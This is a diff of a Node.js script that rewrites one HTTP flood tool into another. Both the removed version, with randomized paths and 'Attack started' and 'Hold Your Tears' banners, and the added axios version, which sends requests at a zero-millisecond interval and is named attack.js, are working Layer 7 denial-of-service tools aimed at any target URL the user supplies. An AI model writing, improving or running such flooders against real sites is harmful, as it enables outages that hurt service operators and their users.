@@ -1,79 +1,47 @@
-const http = require('http');
-const { setTimeout } = require('timers');
-const process = require('process');
+const axios = require('axios');
 
-// Parse inputs
-let host = '';
-let duration = 10; // Default duration in seconds
+// Get command line arguments: target URL and duration
+const [,, targetUrl, timeInSeconds] = process.argv;
 
-const args = process.argv.slice(2);
-
-if (args.length === 2) {
-    host = args[0];
-    duration = parseInt(args[1]);
-} else {
-    console.error(`ERROR\n Usage: ${process.argv[1]} <Hostname> <Duration_in_seconds>`);
-    process.exit(1);
+if (!targetUrl || !timeInSeconds) {
+  console.log('Usage: node attack.js <target_url> <time_in_seconds>');
+  process.exit(1);
 }
 
-// Ensure the host is in the correct format
-if (!/^https?:\/\//.test(host)) {
-    host = 'http://' + host;
+// Convert timeInSeconds to a number and ensure it's valid
+const durationInMs = parseInt(timeInSeconds, 10) * 1000;
+if (isNaN(durationInMs) || durationInMs <= 0) {
+  console.log('Please provide a valid time in seconds.');
+  process.exit(1);
 }
 
-// Generate URL Path
-const generateUrlPath = () => {
-    const msg = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=<>?/,.';
-    let data = '';
-    for (let i = 0; i < 5; i++) {
-        data += msg.charAt(Math.floor(Math.random() * msg.length));
-    }
-    return data;
-};
-
-// Perform the request (L7 HTTP request)
-const attack = () => {
-    const urlPath = generateUrlPath();
-    const options = {
-        method: 'GET',
-        hostname: host.replace(/^https?:\/\//, ''), // Remove protocol (http:// or https://)
-        path: `/${urlPath}`,
-        headers: {
-            'User-Agent': 'Mozilla/5.0',
-            'Connection': 'keep-alive',
-        },
-    };
-
-    const req = http.request(options, (res) => {
-        // Ignore response
-    });
-
-    req.on('error', (err) => {
-        console.error(`Request failed: ${err.message}`);
-    });
-
-    req.end();
-};
-
-// Print attack start message
-console.log(`[#] Attack started on ${host} || Duration: ${duration}s`);
-
-// Start time of the attack
+// Mark the start and stop time for the test
 const startTime = Date.now();
-let threadNum = 0;
+const stopTime = startTime + durationInMs;
 
-// Run the attack for the specified duration
-const attackInterval = setInterval(() => {
-    if (Date.now() - startTime >= duration * 1000) {
-        clearInterval(attackInterval);
-        console.log("\nAttack finished.");
-        return;
+// Function to continuously send HTTP requests
+const sendRequest = async () => {
+  try {
+    const response = await axios.get(targetUrl);
+    console.log(`Request sent: Status ${response.status}`);
+  } catch (error) {
+    console.error(`Request failed: ${error.message}`);
+  }
+};
+
+// Flood the target without delay for the given duration
+const performFlood = () => {
+  const interval = setInterval(() => {
+    if (Date.now() > stopTime) {
+      clearInterval(interval); // Stop after the time limit is reached
+      console.log('Flood test completed.');
+      return;
     }
 
-    // Call attack function to send requests
-    attack();
+    // Send requests continuously
+    sendRequest();
+  }, 0); // No delay, instant flood (this sends requests as fast as the system can handle)
+};
 
-    // Print status message
-    threadNum++;
-    process.stdout.write(`\r ${new Date().toLocaleTimeString()} [${threadNum}] #-#-# Hold Your Tears #-#-#`);
-}, 10); // Adjusting this sleep time will affect requests per second
+// Start the flood attack
+performFlood();
